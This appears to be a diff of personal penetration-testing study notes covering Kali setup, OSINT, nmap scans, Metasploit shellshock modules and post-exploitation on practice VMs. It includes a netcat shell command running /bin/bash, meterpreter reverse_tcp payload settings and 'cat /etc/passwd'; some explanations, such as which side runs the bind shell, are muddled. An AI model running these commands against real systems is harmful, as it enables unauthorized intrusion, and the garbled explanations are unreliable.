@@ -48,7 +48,7 @@ It can be active (directly engaging with the target system) or passive (Gaining 
 
  ## Networking background
 
-- `ipconfig` for windows `ifconfig`
+- `ipconfig` for windows `ifconfig` for kali
 - NAT
 - Media access control (MAC) is the physical address of a device and is in layer 2/ and with switches. 
 - The IP addresses are in layer 3. Anythig using a network interface will have a MAC address
@@ -62,16 +62,16 @@ It can be active (directly engaging with the target system) or passive (Gaining 
 - configure virtual machine- VM ware, assign 4GB ram and then select NAT as the network adapter
 
 shortcuts, double tab, ~/
-    `ls -la` will reveal hidden folders
-    `ls -la` /tmp/  for checking the permissions of the file inside the temp folder
-    `chmod 777 filename.txt` or chmod +x filename.txt giving full read wrtie access
+  -  `ls -la` will reveal hidden folders
+  -  `ls -la` /tmp/  for checking the permissions of the file inside the temp folder
+  -  `chmod 777 filename.txt` or `chmod +x filename.txt` giving full read wrtie execute access
 - `cat /etc/passwd`
 to change password I can type passwd in the terminal
 adding a user to sudoers
 
-    `ifconfig` linux
-    `iwconfig`  wireless
-    `ipconfig`  windows
+ `ifconfig` linux
+ `iwconfig`  wireless
+ `ipconfig`  windows
 
 - Network commands
    ` ping`
@@ -81,15 +81,15 @@ adding a user to sudoers
 ifconfig alternative is ip:
 - `ip a`
 - `ip n`
-- `ipr`
+- `ip r`
 
 - Updating softwares
--   apt update && apt upgrade
+-   `apt update && apt upgrade`
 -  ` apt install python3-pip`
 
 - install pimp upgrate from cloning a github repository in the 
 - cd /opt
-- git clone https://github.com/Dewalt-arch/pimpmykali.git
+- `git clone https://github.com/Dewalt-arch/pimpmykali.git`
 - ./pimpmykali.sh
 
 if gedit gives an error then use.
@@ -97,7 +97,7 @@ if gedit gives an error then use.
 
 `ping 192.168.13.2 -c 1 > ip.txt ` - pings one time and then stores in a file
 `cat ip.txt | grep "64 bytes"` - This will tell me that the data is being able to be received after ping- so those ip addresses maybe active or accible. 
-`cat ip.txt | grep "64 bytes" | cut -d " " -f 4 | tr -d ":"` here tr trauncates at the level of first :, d is delimiter whch in this case is the space and then we are selecting the 4th time his delimiter is used
+`cat ip.txt | grep "64 bytes" | cut -d " " -f 4 | tr -d ":"` here tr trauncates at the level of first :, d is delimiter which in this case is the space and then we are selecting the 4th time this delimiter is used
 
 
 ## Phyton3
@@ -108,29 +108,29 @@ if gedit gives an error then use.
 ```
 ## Open Source Information gathering - also the same if you call it OSNIT
 
-`www.bugcrowd.com` - finding websites to hack who would pay you
-`hunter.io` gives insights regarding the email password
-Heath adams searching the company for datadump from dark web of usernames
-`The harvester` - its built into the Kali linux - It searches information in google
-`sublist3r` app that can be installed: Aids with Searching the subdomains: It is similar to the harvester, but more comprehensive and it is not a built in program. It has to be harvested, for example if i type `sublist3r -d tesla.com -t 100` threadng
+- `www.bugcrowd.com` - finding websites to hack who would pay you
+- `hunter.io` gives insights regarding the email password
+- Heath adams searching the company for datadump from dark web of usernames
+- `The harvester` - its built into the Kali linux - It searches information in google
+- `sublist3r` app that can be installed: Aids with Searching the subdomains: It is similar to the harvester, but more comprehensive and it is not a built in program. It has to be harvested, for example if i type `sublist3r -d tesla.com -t 100` threadng
 Certificate fingerprinting - This also provides information regaring the domains- It can also provide information regaring the sub-sub-domains
-`owasp amass` - can be downloaded using a github repository
+- `owasp amass` - can be downloaded using a github repository
 tomnomnom httpprobe
-`biltwith.com` info regarding the web technoligies related to the website 
-`wapalyzer` very neat tool gives a nice overview about a website
-`whatweb` - built in Kali linux tools. www.tesla.com
-`Burp suite` - has capability of intercepting web traffic, checkout anoher similar tool `foxy proxy`, we can change the request parameters and then examin the response
+- `biltwith.com` info regarding the web technoligies related to the website 
+- `wapalyzer` very neat tool gives a nice overview about a website
+- `whatweb` - built in Kali linux tools. www.tesla.com
+- `Burp suite` - has capability of intercepting web traffic, checkout anoher similar tool `foxy proxy`, we can change the request parameters and then examin the response
 goole fu, `site:tesla.com -www filetype:pdf`
 Utilizing social media
 
 
 **OSINT-Open Source Intelligence**
 
-[osintframework.com](osintframework.com) contains freely available public information- and is legal. **port scans**, **bruteforce attacks** and **social engineering** are active and ilegal wo permission
+[osintframework.com](osintframework.com) contains freely available public information- and is legal. **port scans**, **bruteforce attacks** and **social engineering** are active and ilegal w/o permission
 
 - On this site `framework-domain name-whois records-Domain Dossier` will lead you to the domain information
 - If you check DNS records- it will also give you information regarding the sub-domain
-- The **network whois record** provides info regarding the network ip ranges and CIDR
+- The **network whois record** provides info regarding the network ip ranges and CIDR (Classless interdomain routing) for network ip ranges
 - **DNS records** 
 
 [Google fu](https://www.sans.org/security-resources/GoogleCheatSheet.pdf)
@@ -139,9 +139,9 @@ Utilizing social media
 
 **Google hacking/dorking**
 - Alows the user to find event the webpages that are normally hidden from the user- giving access to sensitive information
-- `site:example.com` - its essentially a sub-domain enumeration task. It can also reveal the file system and assets of the website
+- `site:example.com` If you type this in google search - its essentially a sub-domain enumeration task. It can also reveal the file system and assets of the website
 
-**Shodan/ shodan.io** [shodan.io](shodan.io) - Looks up only the machines that are connected to the internet- scans the entire web
+**Shodan/ shodan.io** [shodan.io](shodan.io) - Looks up only the machines that are connected to the internet- scans the entire web. You can type in the name of the website in OSINT and then get the ip address an then paste that ip address into the shodan.io
 - Looking up DNS (domain naming system) vs DNSSEC
 - This can lead to methods of hacking including:
 - After you are able to find the 
@@ -176,7 +176,7 @@ Running a module to gather info regarding a specific website- or in other words 
 - Then `run`
 
 - Generating a report using **reporting/html**
-- `marketplace install reporting/html` - Not that you should be in the default directory of recon-ng whcih you can get to by typing `back` first.
+- `marketplace install reporting/html` - Not that you should be in the default directory of recon-ng which you can get to by typing `back` first.
 - `marketplace search reporting/html` to check if this has been installed
 - `modules load reporting/html` to load and `info` to look at the details. Note that you must set the creator and attacker
 - `options set CREATOR attacker`
@@ -190,6 +190,8 @@ Running a module to gather info regarding a specific website- or in other words 
 
 
 ## Scanning and enumeration
+
+- Note that Metasploit also has some modules for enumeration and they are called **Auxiliary modules** i-e if I choose to use metasploit
 
 www.vulnhub.com. VULNHUB - you can download a vulnerable virtual machine and then load it into VMware and then practice attacking - has various levels of vulnerable machines
 kioptrix- level 1 This is a first level machine, login john and pw TwoCows2
@@ -229,7 +231,7 @@ nmap can be used for script scaning, OS detection - other options: version detec
 - `nmap -sS -p <victim ip address>`
 
 - UDP scan of port `53`
-- `nmap -sU -p 53 <victim ip address>`
+- `nmap -sU -p 53 < victim ip address>`
 
 - Scans at multiple ports at once: UDP 53, TCP 53, Syn: 53 on the tcp scan
 - `nmap -sS -p U:53,T:53 <victim ip address>` 
@@ -339,6 +341,11 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 
 ## Exploitation
+- The goal of exploitation is to establish a session- Once the session is established then everything after that is considered post-exploitation (done with meterpreter- a linux style shell that metasploit launches to break into target)
+
+- Note the difference: Metasploit is run on the hacker's machine, and Meterpreter is run on the victim machine after exploitation is successful. An alternative to Meterpreter are the various payloads available for specific vulnerabilities. I can also create custom payload modules in metasploit
+
+- Tools of exploitation are payload scripts: Shell shock, heart bleed vulnerability ; or Metasploit
 
 **Remote code execution (RCE)**
 -  This is the process of runing a bash code during exploitation
@@ -454,7 +461,33 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 - When researching about a new vulnerability, questions to ask: What does it do. Which OS versions does it effect, which company was a target. Any pertinent details OpenSSL 
 
 
-- **Metasploit COmmands**
+- **Metasploit** - The commands are not case sensitive
+
+You can search by the name of the modules for example after metasploit is loaded (with `search java`, search `shellshock`)
+
+ - `exploit/windows/browser/java_cmm` is an exploit module, which delivers the exploit to the target system.
+    
+ - `auxiliary/scanner/misc/java_jmx_server` is an auxiliary module, used for tasks such as information gathering, enumeration, and port scanning.
+    
+ - `payload/firefox/gather/cookies` is a payload module.
+
+ If i want to use a particular module then I can type the `use` command and then the path to whatever module I want to load. This load will runn with the shell shock exploit
+
+ - `auxiliary/scanner/http/apache_mod_cgi_bash_env`
+
+
+- Next I can type `info` to learn about what the module does, then I can type `options` to get info about the reuired configurations, then I use `set` to set the configurations and then I type `run` or `exploit` to execute the module as below
+
+-`set RHOSTS <victim ip address` This almost always need to be set
+-`set TARGETURI /cgi-bin/vulnerable` This is the path to use the exploit module
+
+> Some Additional command to run the shell and finding files using the find command
+- Run: `shell` to get the shell command. 
+- Run: `cd /` to the current directory to the root directory. 
+- Run: `find . -iname flag` to find the flag file. 
+
+>TCM 
+
 - `msfconsole`
 - `getuid` if yout type this after establishing a session then you will be able to se whether what level of access we were able to obtain. if its **NT AUthorization** then its the highest level
 - `sysinfo` This will tell us about the system that we have hacked into
@@ -469,6 +502,24 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 - Once you are able to connect. The next step is sending the malware script 
 
+
+## Post-Exploitation
+
+- Once you are able to break into a victim machine (with exploits you found with search sploit) you can run **Meterpreter** on the target or transfer `payloads`. The goal of the paylod is to establish a shell which intern can be **bind shell** - hacker (port) connects to victim (listener) or **reverse shell** - victim(port) connects to hacker (listener- these port openings are called **backdoor**. This step can be done without metasploit if we use `Ncat`
+
+After the exploit is successful, 
+- **bind sgell**
+ -  `nc -lnvp 4444 -e /bin/bash` This command is run on the hacker's computer, sumultaneously you will have to open a port on the victim as well by using `nc <ip address of victim> 4444`
+
+       - `-l`: Tells Ncat to listen for incoming connection.
+          - `-n`: Indicates that we are listening for numeric IP addresses.
+         - `-v`: Means verbose, which will print more information about the connection.
+         - `-p <port number>`: Specifies which port to listen on. 
+         - `-e`: Executes a bash shell, specifically, `/bin/bash`.
+
+
+
+- Payloads are **staged** (the payload is assembled in multiple parts) or **stageless** (all sent at once). A large size payload is likely to fail
 
 - `set payload windows/x64/meterpreter` see if the options for the staged show up. The goal is to just try an alternative with staged approach if the non-staged approach does not work
 - `set payload windows/x64/meterpreter/reverse_tcp` - Note that this is at the exploit level and before you have established the connection
